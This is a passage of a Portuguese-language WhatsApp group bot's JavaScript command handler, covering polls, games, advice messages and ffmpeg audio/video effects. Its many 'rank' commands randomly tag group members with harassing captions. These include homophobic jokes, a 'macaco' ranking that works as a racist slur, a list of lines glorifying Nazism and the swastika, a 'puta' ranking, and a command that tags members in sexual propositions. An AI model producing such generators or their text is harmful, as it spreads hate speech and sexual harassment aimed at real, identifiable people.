if(groupIdscount.indexOf(from) < 0) return reply('O bot nÃ£o tem ainda dados sobre o grupo')
var ind = groupIdscount.indexOf(from)
if(!menc_os2 || menc_jid2[1]) return reply('Marque o @ de quem deseja puxar a atividade / SÃ³ pode um por vez..')
if(numbersIds.indexOf(menc_os2) >= 0) {
var indnum = numbersIds.indexOf(menc_os2)
var RSM_CN = countMessage[ind].numbers[indnum]
await mentions(`Consulta individual da atividade do usuÃ¡rio @${menc_os2.split('@')[0]}\nâ€“\nâ€¢ Quantidade de mensagens enviadas pelo usuÃ¡rio(a): *${RSM_CN.messages}*\nâ€¢ Quantidade de comandos executados pelo usuÃ¡rio(a): *${RSM_CN.cmd_messages}*\nâ€¢ UsuÃ¡rio estÃ¡ conectado em um dispositivo: *${RSM_CN.aparelho}*\nâ€¢ Figurinhas encaminhadas pelo usuÃ¡rio(a) no grupo: *${RSM_CN.figus}*\nâ€“\nã€˜ *${groupName}* ã€™`, [menc_os2], true)
} else {
await mentions(`NÃ£o tenho nenhuma informaÃ§Ã£o no grupo sobre o *@${menc_os2.split('@')[0]}*.`, [menc_os2], true)
}
break

case 'vab': case 'vcprefere': case 'voceprefere':
if(!isGroup) return reply(mess.onlyGroup());
if(!isModobn) return reply(mess.onlyGroupFun(prefix));
await reagir(from, 'ğŸ˜¸'); /* ReaÃ§Ã£o Ã  mensagem, quando solicitar a execuÃ§Ã£o do comando. */
await psycatgames().then(async(array) => {
const { nsfw, questions } = array[Math.floor(Math.random() * array.length)];
const { pergunta1, pergunta2 } = questions[Math.floor(Math.random() * questions.length)];
await sendPoll(yoko, from, "VocÃª prefere...", [pergunta1, pergunta2]); /* Enviar a enquete com as preferÃªncias sorteadas. */
}).catch(async(error) => {
await replyWithReaction(mess.error(), {react: {text: 'ğŸ˜¿', key: info.key}});
});
break

case 'eununca':
if(!isGroup) return reply(mess.onlyGroup());
if(!isModobn) return reply(mess.onlyGroupFun(prefix));
await reagir(from, 'ğŸ¤”'); /* ReaÃ§Ã£o Ã  mensagem, quando solicitar a execuÃ§Ã£o do comando. */
await sendPoll(yoko, from, tools.iNever[Math.floor(Math.random() * tools.iNever.length)], ["Eu nunca", "Eu jÃ¡"]).catch(async(error) => {
await replyWithReaction(mess.error(), {react: {text: 'ğŸ˜­', key: info.key}});
});
break

case 'conselhobiblico': case 'conselhosbiblico': case 'conselhosb': case 'conselhob':
/* [Reagir a mensagem + enviar mensagem prÃ©-definida] -> */ await replyWithReaction(advices.biblicalAdvice[Math.floor(Math.random() * advices.biblicalAdvice.length)], {react: {text: 'ğŸ˜Œ', key: info.key}}).catch(async(error) => {
/* [Reagir a mensagem + enviar mensagem prÃ©-definida] -> */ await replyWithReaction(mess.error(), {react: {text: 'ğŸ˜¿', key: info.key}});
});
break

case 'conselhos': case 'conselho':
/* [Reagir a mensagem + enviar mensagem prÃ©-definida] -> */ await replyWithReaction(advices.commonAdvices[Math.floor(Math.random() * advices.commonAdvices.length)], {react: {text: 'ğŸ˜Œ', key: info.key}}).catch(async(error) => {
/* [Reagir a mensagem + enviar mensagem prÃ©-definida] -> */ await replyWithReaction(mess.error(), {react: {text: 'ğŸ˜¿', key: info.key}});
});
break
 
case 'cantadas': case 'cantada':
/* [Reagir a mensagem + enviar mensagem prÃ©-definida] -> */ await replyWithReaction(tools.Cantadas[Math.floor(Math.random() * tools.Cantadas.length)], {react: {text: 'ğŸ˜¼', key: info.key}}).catch(async(error) => {
/* [Reagir a mensagem + enviar mensagem prÃ©-definida] -> */ await replyWithReaction(mess.error(), {react: {text: 'ğŸ˜¿', key: info.key}});
});
break

case 'fatos': case 'curiosidades':
/* [Reagir a mensagem + enviar mensagem prÃ©-definida] -> */ await replyWithReaction(tools.curiousFacts[Math.floor(Math.random() * tools.curiousFacts.length)], {react: {text: 'ğŸ™€', key: info.key}}).catch(async(error) => {
/* [Reagir a mensagem + enviar mensagem prÃ©-definida] -> */ await replyWithReaction(mess.error(), {react: {text: 'ğŸ˜¿', key: info.key}});
});
break

case 'rankgay': case 'rankgays':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `ğŸ³ï¸â€ğŸŒˆ *RANK DOS 5 MAIS GAYS DO GRUPO!*\nâ€”\n`
TMGAYS = ["Esse aÃ­ gosta de cheirar banana atÃ© umas horas kakak", "Gosta de ser dominado e chicoteado.", "Viadinho gente boa, nada contra os veados.","Esse aÃ­ roda mais que roda de caminhÃ£o.", "Mapoa Ã© vocÃª meu amor?", "Esse aÃ­ ainda tÃ¡ no armÃ¡rio, a franga tÃ¡ presa!", "Profissional na garganta profunda!", "Essa bicha Ã© finÃ­ssima!", "Essa aÃ­ precisa sair do closet ainda!", "Vixi esse aÃ­ e vitaminado!", "Vixi um gay vulgo irene!", "Poc fechosa, amo tu mona!"]
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]} -> ( ${TMGAYS[Math.floor(Math.random() * TMGAYS.length)]} )\n`
}
await mencionarIMG(ABC, rnkgay);
break

case 'rankgado': case 'rankgados':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `ğŸ‚ *RANK DOS 5 MAIS GADO DO GRUPO:*\nâ€”\n`
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mencionarIMG(ABC, rnkgado);
break

case 'rankcorno': case 'rankcornos':
if(!isGroup) return reply(mess.onlyGroup());
if(!isModobn) return reply(mess.onlyGroupFun(prefix));
ABC = `ğŸ‚ *RANK DOS 5 MAIS CORNOS DO GRUPO!*\nâ€”\n`
TMCRN = ["Familiar, leva atÃ© chifre com os parentes!", "Masoquista, leva chifre mas nÃ£o larga a mulher!", "AtÃ©u, leva chifre e nÃ£o acredita!", "PolÃ­tico, sÃ³ faz promessa e nÃ£o cumpre o que fala!", "Esse Ã© que leva chifres, vai embora e volta por causa das crianÃ§as.", "Xuxa, o que nÃ£o larga a mulher por causa dos baixinhos.", "Famoso, aquele que por onde passa Ã© reconhecido como tal.", "InflaÃ§Ã£o, a cada dia que passa o chifre aumenta."]
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]} -> ( ${TMCRN[Math.floor(Math.random() * TMCRN.length)]} )\n`
}
await mencionarIMG(ABC, rnkcorno);
break

case 'surubao': case 'suruba':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
if (!q) return reply(`Eita, coloque o nÃºmero de pessoas apÃ³s o comando.`)
if (Number(q) > 5) return reply("Coloque um nÃºmero menor, ou seja, abaixo de *5*.")
emojiskk = ["ğŸ¥µ", "ğŸ˜ˆ", "ğŸ«£", "ğŸ˜"];
emojis = emojiskk[Math.floor(Math.random() * emojiskk.length)];
frasekk = [`tÃ¡ querendo relaÃ§Ãµes sexuais a ${q}, topa?`, `quer que *${q}* pessoas venham de *chicote, algema e corda de alpinista*.`, `quer que ${q} pessoas der tapa na cara, lhe chame de cachorra e fud3r bem gostosinho...`]
context = frasekk[Math.floor(Math.random() * frasekk.length)]  
ABC = `${emojis} @${sender.split('@')[0]} ${context}\n\n`
for (var i = 0; i < q; i++) {
ABC += `@${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mention(ABC);
break

case 'rankgostosos': case 'rankgostoso':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `*RANK DOS 5 MAIS GOSTOSOS DO GRUPO* ğŸ˜ğŸ”¥\nâ€”\n`
TMGSTS = ["VocÃª tÃ¡ olhando para um semi Deus!", "Mds, me apaixonei! Passa o insta gatinho?", "Ei ei gatinhas, o gostosÃ£o do grupo chegou!", "Gostoso? Ã‰, pena que Ã© homem galinha!", "NÃ£o sei se comparo esse gostoso com o Ares Ridalgo!", "Cruz credo, porque tu tÃ¡ aqui? Tu Ã© feio desgraÃ§a!"]
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]} -> ( ${TMGSTS[Math.floor(Math.random() * TMGSTS.length)]} )\n`
}
await mencionarIMG(ABC, rnkgostoso);
break

case 'rankgostosas': case 'rankgostosa':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `*RANK DAS 5 MAIS GOSTOSAS DO GRUPO* ğŸ˜ğŸ”¥\nâ€”\n`
TMGSTS = ["Calma novinha, assim eu nÃ£o resisto!!","Mds, me apaixonei no sorriso dessa gata!!","Eita gatinha, Passa o insta quando? rs","Credo, sai daqui dragÃ£o!","Ui gata, que rabÃ£o ein!!"]
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]} -> ( ${TMGSTS[Math.floor(Math.random() * TMGSTS.length)]} )\n`
}
await mencionarIMG(ABC, rnkgostosa);
break

case 'ranknazista': case 'ranknazistas':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `*ğŸ’‚â€â™‚RANK DOS 5 MAIS NAZISTAS DO GRUPO åğŸ¤¡*\nâ€”\n`
TMNZTS = ["Soldado nazista, marcha com estilo.â€", "Comandante implacÃ¡vel, lidera com rigor.ï¸", "Nazista estrategista, conquista territÃ³rios.ï¸", "Mestre da ordem, disciplina em primeiro lugar.", "Soldado de elite, Nazista hardcore.", "General invencÃ­vel, domina as batalhas.", "Nazista disciplinado, fiel Ã  causa.", "LÃ­der autoritÃ¡rio, impÃµe respeito.ï¸", "Soldado feroz, nazismo no coraÃ§Ã£o.", "Mestre da propaganda, convence com palavras.ï¸", "Nazista moderno, tecnologia na guerra.", "MÃ¡quina de guerra, implacÃ¡vel e eficiente.ï¸","Comandante supremo, nazismo eterno.", "Soldado leal, marcha em nome da ideologia.", "Nazista clÃ¡ssico, revive o passado.", "General poderoso, Nazista do sÃ©culo XXI.", "Comandante inabalÃ¡vel, Nazista de honra.", "Soldado devoto, nazismo no sangue.", "Mestre da retÃ³rica nazista, convence a todos.", "Nazista visionÃ¡rio, futuro sob a suÃ¡stica."];
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]} -> ( ${TMNZTS[Math.floor(Math.random() * TMNZTS.length)]} )\n`
}
await mencionarIMG(ABC, rnknazista);
break

case 'rankotaku': case 'rankotakus':
if(!isGroup) return reply(mess.onlyGroup());
if(!isModobn) return reply(mess.onlyGroupFun(prefix));
ABC = `*ãŠ™ RANK DOS 5 MAIS OTAKU DO GRUPO ( Ë¶â€¢Ì€ _â€¢Ì Ë¶)*\nâ€”\n`
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mencionarIMG(ABC, rnkotaku);
break

case 'ranksigma': case 'ranksigmas':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `RANK DOS 5 MAIS SIGMAS DO GRUPO ğŸ—¿ğŸ·\n\n`
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mencionarIMG(ABC, rnksigma);
break;

case 'rankbeta': case 'rankbetas':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `RANK DOS 5 MAIS BETAS DO GRUPO ğŸ«µğŸ½ğŸ˜‚\n\n`
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mencionarIMG(ABC, rnkbeta);
break;

case 'rankbaiano': case 'rankbaianos':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `RANK DOS 5 MAIS BAIANOS DO GRUPO ğŸ˜´ğŸ’¤\n\n`
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mencionarIMG(ABC, rnkbaiano);
break;

case 'rankbaiana': case 'rankbaianas':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `RANK DAS 5 MAIS BAIANAS DO GRUPO ğŸ˜´ğŸ’¤\n\n`
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mencionarIMG(ABC, rnkbaiana);
break;

case 'rankcarioca': case 'rankcariocas':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `RANK DOS 5 MAIS CARIOCAS DO GRUPO ğŸ”«ğŸ”¥\n\n`
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mencionarIMG(ABC, rnkcarioca);
break;

case 'ranklouco': case 'rankloucos':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `RANK DOS 5 MAIS LOUCOS DO GRUPO ğŸ’€\n\n`
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mencionarIMG(ABC, rnklouco);
break;

case 'ranklouca': case 'rankloucas':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `RANK DAS 5 MAIS LOUCAS DO GRUPO ğŸ’€\n\n`
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mencionarIMG(ABC, rnklouca);
break;

case 'ranksafada': case 'ranksafadas':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `RANK DAS 5 MAIS SAFADAS DO GRUPO ğŸ˜ğŸ”¥\n\n`
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mencionarIMG(ABC, rnksafada);
break;

case 'ranksafado': case 'ranksafados':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `RANK DOS 5 MAIS SAFADOS DO GRUPO ğŸ¥µğŸ”¥\n\n`
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mencionarIMG(ABC, rnksafado);
break;

case 'rankmacaco': case 'rankmacacos':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `RANK DOS 5 MAIS MACACOS DO GRUPO ğŸ’\n\n`
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mencionarIMG(ABC, rnkmacaco);
break;

case 'rankmacaca': case 'rankmacacas':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `RANK DAS 5 MAIS MACACAS DO GRUPO ğŸ’\n\n`
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mencionarIMG(ABC, rnkmacaca);
break;

case 'rankputa': case 'rankputas':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `RANK DAS 5 MAIS PUTAS DO GRUPO ğŸ˜ˆğŸ”¥\n\n`
for (var i = 0; i < 5; i++) {
ABC += `â€¢ ${i+1}Â° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
await mencionarIMG(ABC, rnkputa);
break;

case 'rankpau':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
ABC = `*RANK DOS 5 PAU MAIOR DO GRUPO ğŸ“*\nâ€”\n`
TMPAU = ["Pequeno pra cact, se mata maluco", `Pequenininho chega ser atÃ© fofo`, `Menor que meu dedo mindinho pequeno demais`, `AtÃ© que dÃ¡ sentir, tÃ¡ na mÃ©dia`, `AtÃ© que Ã© grandinho`, `Grande atÃ©!`, `Gigantesco igual meu braÃ§o`, `Enorme quase chega no Ãºtero`, `GrandÃ£o demais em, e uii`, `Vara de pegar manga, grande demais, como sai na rua assim??`, "Que grandÃ£o em, nasceu metade animal"]
for (var i = 0; i < 5; i++) {
ABC += `â€¢ *${i+1}Â°* @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]} -> ( ${TMPAU[Math.floor(Math.random() * TMPAU.length)]} )\n`
}
await mencionarIMG(ABC, rnkpau);
break

case 'mencionar':
if (!q) return reply(`VocÃª usou o comando de forma incorreta, use a correta: ${prefix}mencionar corno`);
if (!isGroup) return reply(`Esta brincadeira sÃ³ funciona em grupos.`);
if(!isModobn) return reply(mess.onlyGroupFun(prefix));
await mention(`Estou mencionando o *${q}* do grupo: *@${groupMembers[Math.floor(Math.random() * groupMetadata.participants.length)].id.split('@')[0]}*`);
break

case 'jogodavelha':
if(!isGroup) return reply(mess.onlyGroup());
if(!menc_jid2) return reply("Marque junto com o comando, o @ do usuÃ¡rio que deseja desafiar..");
joguinhodavelhajs.push(sender)
fs.writeFileSync('./yoko/bunker/database/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.push(from)
fs.writeFileSync('./yoko/bunker/database/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
if(fs.existsSync(`./yoko/bunker//tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
const matrix = boardnow._matrix;
await mention( `ã€ *ğŸ® á€Ì¸áªÌ¸á·Ì¸á¬Ì¸ á Ì¸áªÌ¸ á™Ì¸á¬Ì¸áÌ¸á»Ì¸áªÌ¸ ğŸ•¹ï¸* ã€\nâ€”\nğŸ’¢ AlguÃ©m estÃ¡ jogando o *jogo da velha* no momento! Por favor, aguarde o tÃ©rmino da partida para iniciar a prÃ³xima.\nâ€”\nâ€¢ Atualmente estÃ¡ ocorrendo uma disputa entre os jogadores: ''@${boardnow.X} VS @${boardnow.O}'. Quem serÃ¡ que ganha? Tire seus palpites!`)
}
if(argss.length === 1) return reply(`Jogue com alguÃ©m, para inicar a partida : ${prefix + command} @membro.`);
const boardnow = setGame(`${from}`);
console.log(colors.red(time, "red"), colors.magenta("[ JOGO DA VELHA ]"), colors.white(`Iniciado - SessÃ£o: ${boardnow.session}`));
boardnow.status = false;
boardnow.X = sender.replace("@s.whatsapp.net", "");
boardnow.O = argss[1].replace("@", "");
var blabord = [`${boardnow.X}`, `${boardnow.O}`]
fs.writeFileSync(`./yoko/bunker//tictactoe/db/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
await mentions( `ã€ *ğŸ“Œ á¬Õá¢á¬á¡áªÎá Ï´ Ï´ Ï´á¢Ï´Îá¬ÎÍ²á¬ âš”ï¸* ã€\nâ€”\n@${sender.replace("@s.whatsapp.net", "")} estÃ¡ te desafiando para uma partida de jogo da velha...\n[${argss[1]}], use *'S'* para aceitar ou *'N'* para nÃ£o aceitar...\nâ€”\nâ€¢ Em caso de problemas, marque algum administrador para resetar o jogo com o comando ${prefix}rv`, [sender, menc_jid], true);
break

case 'resetarvelha':
case 'resetavelha':  
case 'resetarv':
case 'resetav': 
case 'resetvelha':
case 'rv': 
if(!isJoguin && !isGroupAdmins) return reply(`Fale com quem iniciou o jogo, sÃ³ ele pode resetar, ou entÃ£o algum admin.`)
if(fs.existsSync("./yoko/bunker//tictactoe/db/" + from + ".json")) {
DLT_FL("./yoko/bunker//tictactoe/db/" + from + ".json");
reply(`Jogo da velha resetado com sucesso nesse grupo!`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./yoko/bunker/database/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./yoko/bunker/database/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
} else {
reply(`NÃ£o a nenhuma sessÃ£o em andamento...`);
}
break

case "ppt":
if(args.length < 1) return reply(`VocÃª deve digitar ${prefix}ppt pedra, ${prefix}ppt papel ou ${prefix}ppt tesoura`);
ppt = ["pedra", "papel", "tesoura"];
ppy = ppt[Math.floor(Math.random() * ppt.length)];
ppg = Math.floor(Math.random() * 1) + 10
pptb = ppy
if((pptb == "pedra" && args == "papel") ||
(pptb == "papel" && args == "tesoura") ||
(pptb == "tesoura" && args == "pedra")) {
var vit = "vitoria"
} else if((pptb == "pedra" && args == "tesoura") ||
(pptb == "papel" && args == "pedra") ||
(pptb == "tesoura" && args == "papel")) {
var vit = "derrota"
} else if((pptb == "pedra" && args == "pedra") ||
(pptb == "papel" && args == "papel") ||
(pptb == "tesoura" && args == "tesoura")) {
var vit = "empate"
} else if(vit = "undefined") {
return reply(`VocÃª deve digitar ${prefix}ppt pedra, ${prefix}ppt papel ou ${prefix}ppt tesoura`)
}
if(vit == "vitoria") {var tes = "VitÃ³ria do jogador"}
if(vit == "derrota") {var tes = "A vitÃ³ria Ã© do BOT"} 
if(vit == "empate") {var tes = "O jogo terminou em empate"}
reply(`*${NomeDoBot}* jogou ${pptb}, o jogador jogou: ${args} -> *${tes}*`);
break

case 'bot':
soundft = await fetch(qviado).then(v => v.buffer());
await yoko.sendMessage(from, {audio: soundft, mimetype: 'audio/mpeg', ptt: true}, {quoted: selo});
break

case 'videocontrario':
case 'reversevid':
if((isMedia && info.message.videoMessage || !isQuotedImage) && !q.length <= 1) { 
reply(mess.wait())
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, async(err) => {
await DLT_FL(media)
if(err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
await yoko.sendMessage(from, {video: buffer453, mimetype: 'video/mp4'}, {quoted: selo})
DLT_FL(ran)
})
} else {
reply("Marque um vÃ­deo..")
}
break 

case 'videolento':
case 'slowvid':  
if((isMedia && info.message.videoMessage || !isQuotedImage) && !q.length <= 1) {
reply(mess.wait()) 
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, async(err) => {
await DLT_FL(media)
if(err) return reply(`Error: ${err}`)
buffer453 = fs.readFileSync(ran)
await yoko.sendMessage(from, {video: buffer453, mimetype: 'video/mp4'}, {quoted: selo})
await DLT_FL(ran)
})
} else {
reply("Marque um vÃ­deo..")
}
break

case 'videorapido':
case 'fastvid':  
if((isMedia && info.message.videoMessage || !isQuotedImage) && !q.length <= 1) {
reply(mess.wait())
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, async(err) => {
await DLT_FL(media)
if(err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
await yoko.sendMessage(from, {video: buffer453, mimetype: 'video/mp4'}, {quoted: selo })
await DLT_FL(ran)
})	
} else {
reply("Marque o vÃ­deo..")
}
break

case 'grave2':
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(mess.wait())
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, async(err, stderr, stdout) => {
await DLT_FL(gem)
if(err) return reply('Ocorreu um erro ao adicionar o *efeito sonoro* no Ã¡udio.')
hah = fs.readFileSync(ran)
await yoko.sendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
await DLT_FL(ran)
})
} else {
reply("Marque o Ã¡udio..")
}
break

case 'grave':
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(mess.wait())
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, async(err, stderr, stdout) => {
await DLT_FL(gem)
if(err) return reply('Ocorreu um erro ao adicionar o *efeito sonoro* no Ã¡udio.')
hah = fs.readFileSync(ran)
await yoko.sendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
await DLT_FL(ran)
})
} else {
reply("Marque o Ã¡udio..");
}
break

case 'adolesc':
case 'vozmenino':  
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(mess.wait())
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, async(err, stderr, stdout) => {
await DLT_FL(gem)
if(err) return reply('Ocorreu um erro ao adicionar o *efeito sonoro* no Ã¡udio.');
hah = fs.readFileSync(ran)
await yoko.sendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
await DLT_FL(ran)
})
} else {
reply("Marque o Ã¡udio..")
}
break  

case 'tomp3':
if((isMedia && !info.message.imageMessage || isQuotedVideo)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.videoMessage
reply(mess.wait())
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane 
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, async(err) => { 
await DLT_FL(media)
if(err) return reply('Ocorreu uma falha ao fazer a conversÃ£o do vÃ­deo para mp3.')
buffer = fs.readFileSync(ran)
await yoko.sendMessage(from, {audio: buffer, mimetype: 'audio/mpeg'}, {quoted: selo})
await DLT_FL(ran)
})
} else {
reply("Marque o vÃ­deo para transformar em Ã¡udio por favor...")
}
break

case 'bass3':
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(mess.wait())
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, async(err, stderr, stdout) => {
await DLT_FL(gem)
if(err) return reply('Ocorreu um erro ao adicionar o *efeito sonoro* no Ã¡udio.')
hah = fs.readFileSync(ran)
